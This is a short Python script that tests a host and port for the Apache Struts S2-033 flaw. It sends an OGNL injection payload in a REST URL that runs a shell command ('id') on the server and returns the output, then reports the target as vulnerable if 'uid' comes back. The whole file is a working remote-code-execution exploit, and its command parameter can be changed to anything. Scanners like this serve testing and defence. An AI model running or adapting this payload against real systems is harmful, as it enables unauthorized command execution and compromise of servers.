try:
    import requests,sys,os,logging
except:
    os._exit(6)

logging.basicConfig(level=logging.INFO,format='%(message)s')
class VulTest:
    def __init__(self, url,port):
        if '://' not in url:
            url = 'http://' + url+":"+port
        self.url = url.strip('/')


    def Test(self):
        try:
            req = requests.get(self.url + '''/orders/3/%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23process%3D@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]),%23ros%3D(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())%2C@org.apache.commons.io.IOUtils@copy(%23process.getInputStream()%2C%23ros)%2C%23ros.flush(),%23xx%3d123,%23xx.toString.json?&command=id''',timeout=3)
		#print req.text
        except:
            os._exit(4)
        if ('uid' in req.text):
            logging.info('[+] Found S2-033 in ' + self.url)
            os._exit(1)
        else:
            logging.info('[-] S2-033 Not Found in ' + self.url)
            os._exit(2)


if __name__ == '__main__':
    url = sys.argv[1]
    port = sys.argv[2]
    #url = '192.168.136.130'
    test = VulTest(url,port)
    try:
        test.Test()
    except:
        os._exit(3)
    

